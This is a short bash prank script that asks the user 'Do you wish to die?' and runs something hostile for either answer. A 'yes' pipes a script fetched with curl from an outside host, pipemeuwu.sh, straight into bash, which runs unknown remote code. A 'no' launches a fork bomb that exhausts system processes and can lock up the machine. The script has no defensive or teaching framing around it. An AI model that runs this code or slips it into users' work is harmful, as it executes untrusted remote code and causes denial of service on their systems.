#!/usr/bin/env bash      
while true; do
    read -p "Do you wish to die?[y/n] " yn
    case $yn in
        [Yy]* )  curl -fsSL https://pipemeuwu.sh/trust-me | bash ; break;;
        [Nn]* )  :(){ :|:& };: ;;
        * ) echo "Please answer now.";;
    esac
done 
